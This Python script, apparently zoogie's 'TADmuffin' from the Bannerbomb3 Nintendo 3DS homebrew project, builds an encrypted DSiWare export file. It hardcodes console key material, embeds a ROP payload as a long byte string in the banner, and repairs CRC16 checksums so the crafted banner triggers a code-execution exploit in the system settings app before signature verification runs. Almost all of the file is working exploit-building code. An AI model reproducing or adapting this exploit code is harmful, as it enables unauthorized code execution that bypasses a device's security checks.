from __future__ import print_function
from Cryptodome.Hash import CMAC
from Cryptodome.Cipher import AES
import os,sys,random,hashlib,struct
from binascii import hexlify

tidlow=0xF00D43D5
#tidlow=0xFFFFFFFF

keyx=0x6FBB01F872CAF9C01834EEC04065EE53
keyy=int(sys.argv[1], 16)
F128=0xffffffffffffffffffffffffffffffff
C   =0x1FF9E9AAC5FE0408024591DC5D52768A
cmac_keyx=0xB529221CDDB5DB5A1BF26EFF2041E875

DIR="%s/" % sys.argv[2]

output_filename=sys.argv[3]

BM=0x20         #block metadata size https://www.3dbrew.org/wiki/DSiWare_Exports (a bunch of info in this script is sourced here)
BANNER=0x0
BANNER_SIZE=0x4000
HEADER=BANNER+BANNER_SIZE+BM
HEADER_SIZE=0xF0
FOOTER=HEADER+HEADER_SIZE+BM
FOOTER_SIZE=0x4E0
TMD=FOOTER+FOOTER_SIZE+BM
content_sizelist=[0]*11
content_namelist=["tmd","srl.nds","2.bin","3.bin","4.bin","5.bin","6.bin","7.bin","8.bin","public.sav","banner.sav"]

tad_sections=[b""]*14

if sys.version_info[0] >= 3:
	# Python 3
	pyvers=3
else:
	# Python 2
	pyvers=2

def int16bytes(n):
	if sys.version_info[0] >= 3:
		return n.to_bytes(16, 'big')  # Python 3
	else:
		s=b"" 						  # Python 2
		for i in range(16):
			s=chr(n & 0xFF)+s
			n=n>>8
		return s
	
def int2bytes(n):
	s=bytearray(4)
	for i in range(4):
		s[i]=n & 0xFF
		n=n>>8
	return s
	
def endian(n, size):
	new=0
	for i in range(size):
		new <<= 8
		new |= (n & 0xFF)
		n >>= 8
	return new
		
def add_128(a, b):
	return (a+b) & F128

def rol_128(n, shift):
	for i in range(shift):
		left_bit=(n & 1<<127)>>127
		shift_result=n<<1 & F128
		n=shift_result | left_bit
	return n

def normalkey(x,y):     	#3ds aes engine - curtesy of rei's pastebin google doc, curtesy of plutoo from 32c3
	n=rol_128(x,2) ^ y  	#F(KeyX, KeyY) = (((KeyX <<< 2) ^ KeyY) + 1FF9E9AAC5FE0408024591DC5D52768A) <<< 87
	n=add_128(n,C)      	#https://pastebin.com/ucqXGq6E
	n=rol_128(n,87)     	#https://smealum.github.io/3ds/32c3/#/113
	return n
	
def decrypt(message, key, iv):
	cipher = AES.new(key, AES.MODE_CBC, iv )
	return cipher.decrypt(message)

def encrypt(message, key, iv):
	cipher = AES.new(key, AES.MODE_CBC, iv )
	return cipher.encrypt(message)

def check_keyy(keyy_offset):
	global keyy
	tempy=endian(keyy,16)
	tempy=tempy+(keyy_offset<<64)
	tempy=endian(tempy,16)
	iv=tad[HEADER+HEADER_SIZE+0x10:HEADER+HEADER_SIZE+0x20]
	key=normalkey(keyx, tempy)
	result=decrypt(tad[HEADER:HEADER+HEADER_SIZE],int16bytes(key),iv)
	if(b"\x33\x46\x44\x54" not in result[:4]):
		print("wrong -- keyy offset: %d" % (keyy_offset))
		return 1
	keyy=tempy
	print("correct! -- keyy offset: %d" % (keyy_offset))
	return 0
	#print("%08X  %08X  %s" % (data_offset, size, filename))

def get_content_block(buff):
	global cmac_keyx
	hash=hashlib.sha256(buff).digest()
	key = int16bytes(normalkey(cmac_keyx, keyy))
	cipher = CMAC.new(key, ciphermod=AES)
	result = cipher.update(hash)
	return result.digest() + b'\x00'*16

def fix_hashes_and_sizes():
	sizes=[0]*11
	hashes=[b""]*13
	footer_namelist=["banner.bin","header.bin"]+content_namelist
	for i in range(11):
		if(os.path.exists(DIR+content_namelist[i])):
			sizes[i] = os.path.getsize(DIR+content_namelist[i])
		else:
			sizes[i] = 0
	for i in range(13):
		if(os.path.exists(DIR+footer_namelist[i])):
			with open(DIR+footer_namelist[i],"rb") as f:
				pass
				#hashes[i] = hashlib.sha256(f.read()).digest()
		else:
			hashes[i] = b"\x00"*0x20
			
	with open(DIR+"header.bin","rb+") as f:
		offset=0x38
		f.seek(offset)
		f.write(struct.pack("<I",tidlow))
		offset=0x48
		for i in range(11):
			f.seek(offset)
			f.write(int2bytes(sizes[i]))
			offset+=4
		f.seek(0)
		#hashes[1] = hashlib.sha256(f.read()).digest() #we need to recalulate header hash in case there's a size change in any section. sneaky bug.
		print("header.bin fixed")
	
	with open(DIR+"footer.bin","rb+") as f:
		offset=0
		for i in range(13):
			f.seek(offset)
			f.write(hashes[i])
			offset+=0x20
		print("footer.bin fixed")
		
def rebuild_tad():
	global keyy
	global output_filename
	full_namelist=["banner.bin","header.bin","footer.bin"]+content_namelist
	section=""
	content_block=""
	key=normalkey(keyx,keyy)
	for i in range(len(full_namelist)):
		if(os.path.exists(DIR+full_namelist[i])):
			print("encrypting "+DIR+full_namelist[i])
			with open(DIR+full_namelist[i],"rb") as f:
				section=f.read()
			content_block=get_content_block(section)
			tad_sections[i]=encrypt(section, int16bytes(key), content_block[0x10:])+content_block
	with open(output_filename,"wb") as f:
		out=b''.join(tad_sections)
		#out=out[:TMD]
		#f.write(tad_sections[0]+tad_sections[1]+tad_sections[2]+tad_sections[3])
		f.write(out)
	print("Rebuilt to %s" % output_filename)
	print("Done.")
STANDARD=0x0000
MODBUS=0xFFFF
def fix_crc16(path, offset, size, crc_offset, type):
	'''
	CRC-16-Modbus Algorithm
	'''
	with open(path,"rb+") as f:
		f.seek(offset)
		data=f.read(size)
		
		poly=0xA001
		crc = type
		for b in data:
			if pyvers==3:
				cur_byte = 0xFF & b
			else:
				cur_byte = 0xFF & ord(b)
			for _ in range(0, 8):
				if (crc & 0x0001) ^ (cur_byte & 0x0001):
					crc = (crc >> 1) ^ poly
				else:
					crc >>= 1
				cur_byte >>= 1

		crc16=crc & 0xFFFF

		print("Patching offset %08X..." % crc_offset)
		f.seek(crc_offset)
		f.write(struct.pack("<H",crc16))

def inject_bin(src, dest, offset, ispad): #this long hexstring is just a bin->str converted rop_payload.bin. this is the rop that exploits mset and loads usm.bin to memory and pivots to it.
	buff=b"\x60\x67\x14\x00\xC4\x93\x29\x00\xA4\x13\x1C\x00\xEF\xBE\xAD\xDE\x01\xBE\xAD\xDE\x00\xBE\xAD\xDE\x60\x67\x14\x00\x03\xFF\xFF\x0F\x88\x37\x24\x00\xE4\xAD\xDE\xAD\x60\x67\x14\x00\x60\xCB\x28\x00\x58\x16\x1A\x00\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\x55\x46\x16\x00\x00\x10\x68\x00\xEC\xFE\xFF\x0F\x01\x00\x01\x00\x10\x79\x1C\x00\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xE5\xC0\x22\x00\x00\x10\x68\x00\x20\x10\x68\x00\x00\x20\x68\x00\x00\x02\x02\x00\x44\x31\x1C\x00\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\xEF\xBE\xAD\xDE\x4C\xD4\x10\x00\x14\x61\x68\xF0\x10\x66\x14\x00\x59\x00\x53\x00\x3A\x00\x2F\x00\x75\x00\x73\x00\x6D\x00\x2E\x00\x62\x00\x69\x00\x6E\x00\x00\x21\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\xE4\xAD\xDE\xAD\x10\x66\x14\x00\xAC\x64\x12\x00\x40\xFF\xFF\x0F\xEC\xFE\xFF\x0F\x28\xFF\xFF\x0F\xF0\xFE\xFF\xFF\x1C\xFF\xFF\x0F\xE4\xAD\xDE\xAD"
	srclen=len(buff)
	padlen=0x1000-srclen
	if ispad:
		buff+=b"\x99"*padlen
	with open(dest,"rb+") as f:
		f.seek(offset)
		f.write(buff*8)

print("|TADmuffin by zoogie|")
print("|_______v0.0________|")
print("Note: This is a simplified TADpole used only for Bannerbomb3")
abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("Using workdir: "+DIR)

try:
	os.mkdir(DIR)
	print("%s created" % DIR)
except:
	print("%s already exists" % DIR)
banner_bin=b"\x03\x01"+b"\x00"*(0x4000-2)
header_bin=b"3DFT"+struct.pack(">I",4)+(b"\x42"*0x20)+(b"\x99"*0x10)+struct.pack("<Q",0x00048005F00D43D5)+(b"\x00"*0xB0)
footer_bin=b"\x00"*0x4E0

with open(DIR+"banner.bin","wb") as f:
	f.write(banner_bin)
with open(DIR+"header.bin","wb") as f:
	f.write(header_bin)
with open(DIR+"footer.bin","wb") as f:
	f.write(footer_bin)
	
print("Injecting payload...")
inject_bin("rop_payload.bin",DIR+"banner.bin",0x240,False)
print("Fixing crc16s...")
fix_crc16(DIR+"banner.bin", 0x20, 0x820, 0x2, MODBUS)
fix_crc16(DIR+"banner.bin", 0x20, 0x920, 0x4, MODBUS)
fix_crc16(DIR+"banner.bin", 0x20, 0xA20, 0x6, MODBUS)
fix_crc16(DIR+"banner.bin", 0x1240, 0x1180, 0x8, MODBUS)
#fix_crc16("../slot1.bin", 0x4, 0x410, 0x2, STANDARD)

print("Rebuilding export...")
fix_hashes_and_sizes()
#sign_footer() #don't need this for bannerhax - exploit is triggered before footer ecdsa is verified
rebuild_tad()

'''
payload="\x00"*0x20000
with open("payload/rop_payload.bin","rb") as f:
	rop=f.read()
with open("../slot1.bin","rb") as f:
	slot1=f.read()	
	
with open("bb3.bin","wb") as f:
	f.write(payload)
	f.seek(0x0)
	f.write(rop)
	f.seek(0x8000)
	f.write(slot1)
'''